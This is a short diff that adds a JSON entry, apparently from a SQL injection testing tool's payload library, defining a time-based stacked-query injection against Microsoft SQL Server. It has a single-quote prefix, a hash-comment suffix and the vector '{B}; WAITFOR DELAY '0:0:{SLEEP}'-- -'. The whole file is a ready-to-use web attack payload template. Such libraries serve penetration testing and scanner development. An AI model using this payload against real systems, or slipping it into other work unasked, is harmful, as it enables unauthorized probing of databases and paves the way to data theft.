@@ -1,0 +1,12 @@
+{
+ "dbms": "mssql",
+ "technique": "stacked",
+ "boundary": {
+  "prefix": "'",
+  "suffix": "#",
+  "type": "single-quote",
+  "desc": "single-quoted + hash comment"
+ },
+ "vector": "{B}; WAITFOR DELAY '0:0:{SLEEP}'-- -",
+ "comment": "mssql stacked via single-quoted + hash comment"
+}
